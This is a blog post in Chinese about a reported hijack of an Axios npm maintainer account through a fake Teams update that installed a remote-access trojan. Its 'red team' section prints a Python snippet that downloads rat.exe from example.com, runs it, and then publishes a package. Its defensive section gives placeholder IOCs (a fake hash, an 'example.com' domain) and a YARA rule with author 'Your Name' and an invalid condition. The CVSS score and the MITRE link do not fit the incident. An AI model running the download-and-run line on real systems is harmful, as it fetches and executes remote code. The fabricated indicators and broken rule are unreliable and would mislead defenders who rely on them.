---
layout: post
title:  "Axios npm hack used fake Teams error fix to hijack maintainer account"
date:   2026-04-05 01:51:48 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Axios NPM 滲透攻擊：社會工程學與供應鏈攻擊的結合

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: 社會工程學、供應鏈攻擊、RAT (Remote Access Trojan)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Axios 的維護者之一被社會工程學攻擊，導致攻擊者取得了 npm 的帳戶權限，進而發布了惡意版本的 Axios。
* **攻擊流程圖解**:
  1. 攻擊者使用社會工程學手法，假冒公司並邀請維護者加入 Slack 工作空間。
  2. 維護者被邀請加入 Microsoft Teams 會議，會議中出現技術錯誤，提示維護者安裝 Teams 更新。
  3. 維護者安裝了惡意的 Teams 更新，實際上是一個 RAT。
  4. RAT 獲取了維護者的 npm 帳戶權限，攻擊者發布了惡意版本的 Axios。
* **受影響元件**: Axios 1.14.1 和 0.30.4 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要取得維護者的信任，進而獲得 npm 帳戶權限。
* **Payload 建構邏輯**:

    ```
    
    python
    # 惡意的 Teams 更新
    import os
    import subprocess
    
    # 下載和安裝 RAT
    subprocess.run(["curl", "-o", "rat.exe", "https://example.com/rat.exe"])
    subprocess.run(["rat.exe"])
    
    # 獲取 npm 帳戶權限
    import requests
    response = requests.post("https://npm.example.com/login", data={"username": "maintainer", "password": "password"})
    if response.status_code == 200:
        # 發布惡意版本的 Axios
        subprocess.run(["npm", "publish", "axios-1.14.1.tgz"])
    
    ```
* **繞過技術**: 攻擊者使用社會工程學手法，假冒公司和維護者的同事，進而獲得維護者的信任。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | example.com | /usr/local/bin/rat.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule axios_malware {
        meta:
            description = "Detects Axios malware"
            author = "Your Name"
        strings:
            $a = "rat.exe"
        condition:
            $a in (pe.imports)
    }
    
    ```
* **緩解措施**: 更新 Axios 至最新版本，變更 npm 帳戶密碼，啟用 MFA (Multi-Factor Authentication)。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **社會工程學 (Social Engineering)**: 一種攻擊手法，利用人類心理和行為的弱點，進而獲得敏感信息或權限。
* **供應鏈攻擊 (Supply Chain Attack)**: 一種攻擊手法，利用軟件或硬件的供應鏈，進而攻擊最終用戶。
* **RAT (Remote Access Trojan)**: 一種惡意軟件，允許攻擊者遠程控制受害者的系統。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/axios-npm-hack-used-fake-teams-error-fix-to-hijack-maintainer-account/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


